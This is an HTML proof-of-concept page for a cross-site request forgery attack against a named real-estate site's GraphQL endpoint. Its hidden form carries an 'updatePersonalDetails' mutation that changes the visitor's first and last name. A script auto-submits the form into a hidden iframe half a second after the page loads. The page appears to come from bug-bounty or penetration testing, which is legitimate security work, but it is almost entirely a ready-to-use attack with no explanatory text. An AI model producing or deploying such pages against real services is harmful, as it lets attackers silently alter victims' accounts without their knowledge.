<!doctype html>
<html>
<head><meta charset="utf-8"><title>CSRF PoC - form fallback</title></head>
<body>
<h3>CSRF PoC (form fallback) â€” auto-submit</h3>

<form id="poc" action="https://mexa.realestate.com.au/graphql" method="POST" enctype="application/x-www-form-urlencoded" target="hidden_iframe">
  <!-- Many GraphQL servers accept 'query' and 'variables' as form fields -->
  <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: personalDetailsInput!) { updatePersonalDetails(input: $input) { firstName lastName __typename } }'>
  <input type="hidden" name="variables" value='{"input":{"firstName":"admin","lastName":"nalla"}}'>
  <button type="submit">Submit</button>
</form>

<iframe name="hidden_iframe" style="display:none;"></iframe>

<script>
  // auto-submit after a short delay (mimic user visit)
  setTimeout(()=>document.getElementById('poc').submit(), 500);
</script>
</body>
</html>
